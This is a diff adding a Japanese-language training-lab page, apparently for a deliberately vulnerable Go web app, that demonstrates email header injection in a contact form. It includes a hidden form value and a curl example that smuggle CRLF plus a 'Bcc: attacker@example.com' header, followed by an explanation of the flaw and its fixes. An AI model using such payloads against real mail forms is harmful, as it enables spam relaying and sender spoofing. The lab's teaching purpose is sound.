@@ -1,0 +1,53 @@
+{{template "header" .}}
+<h1>メールヘッダインジェクション: お問い合わせ</h1>
+<p>お問い合わせフォームです。送信すると、サーバーが組み立てたメールの内容を確認できます
+(安全のため、このラボでは実際にメールを送信せず、プレビュー表示のみ行います)。</p>
+
+<form method="post" action="/mail/contact">
+  <p><label>お名前 <input name="name" value="{{.Name}}" size="30"></label></p>
+  <p><label>メールアドレス(返信先) <input name="email" value="{{.Email}}" size="30"></label></p>
+  <p><label>件名 <input name="subject" value="{{.Subject}}" size="40"></label></p>
+  <p><label>本文<br><textarea name="body" rows="4" cols="50">{{.Body}}</textarea></label></p>
+  <p><button type="submit">送信(プレビュー表示のみ)</button></p>
+</form>
+
+<h2>ワンクリックで試す</h2>
+<p>ブラウザの1行入力欄には改行を直接入力しにくいため、改行を文字参照(<code>&amp;#13;&amp;#10;</code>)で埋め込んだボタンを用意しています。</p>
+<form method="post" action="/mail/contact" style="display:inline">
+  <input type="hidden" name="name" value="攻撃者">
+  <input type="hidden" name="email" value="foo@example.com&#13;&#10;Bcc: attacker@example.com&#13;&#10;X-Injected: true">
+  <input type="hidden" name="subject" value="お問い合わせ">
+  <input type="hidden" name="body" value="よろしくお願いします。">
+  <button class="btn" type="submit">Bccを注入する</button>
+</form>
+
+{{if .Sent}}
+<h2>実際に送信される(想定の)メール</h2>
+<p>SMTPサーバーに渡される直前の生のメッセージです。</p>
+<pre>{{.Raw}}</pre>
+{{end}}
+
+<details>
+  <summary>ヒント</summary>
+  <ul>
+    <li>メールアドレス欄に改行(<code>\r\n</code>)を入れて、新しいヘッダ行(<code>Bcc:</code> など)を追加できないでしょうか?</li>
+    <li>ブラウザの1行テキスト欄は、キーボードで改行を打とうとしても送信扱いになったり、貼り付けても改行が消えたりします。「ワンクリックで試す」のボタンは、HTMLの文字参照で実際の改行文字を埋め込んでいます。</li>
+    <li>実際の攻撃では、ブラウザを使わず <code>curl</code> や Burp Suite などでリクエストを直接組み立てます。例:
+      <pre>curl -d "name=A&email=foo%40example.com%0D%0ABcc: attacker%40example.com&subject=Hi&body=Hello" http://127.0.0.1:8080/mail/contact</pre>
+    </li>
+    <li>件名欄でも同じことができます。</li>
+  </ul>
+</details>
+
+<details>
+  <summary>なぜ危険か / 本来どう直すか</summary>
+  <p>SMTP(メール送信プロトコル)は、メールヘッダを <code>\r\n</code> で区切られた行の並びとして解釈します。入力値をそのままヘッダに連結すると、入力に含まれる改行がヘッダの区切りとして解釈され、攻撃者は任意のヘッダ(<code>Bcc</code> での不正な宛先追加、<code>From</code> の偽装、スパムの踏み台化など)を注入できます。</p>
+  <p>対策は次のとおりです。</p>
+  <ul>
+    <li><strong>入力に改行を含めない</strong>: メールアドレス・件名など、1行であるべき値に <code>\r</code> や <code>\n</code> が含まれていないか検証し、含まれていれば拒否する。</li>
+    <li><strong>専用ライブラリを使う</strong>: Go では <code>net/mail</code> の <code>Address</code> 型のような、ヘッダを安全に組み立てる仕組みを使い、文字列連結を避ける。</li>
+    <li><strong>アドレスの構文検証</strong>: <code>net/mail.ParseAddress</code> で検証する(改行を含む値はここで弾かれるべき)。</li>
+    <li><strong>利用者に渡すヘッダを最小限にする</strong>: <code>Bcc</code> や追加ヘッダを、利用者の入力から直接組み立てさせない。</li>
+  </ul>
+</details>
+{{template "footer" .}}
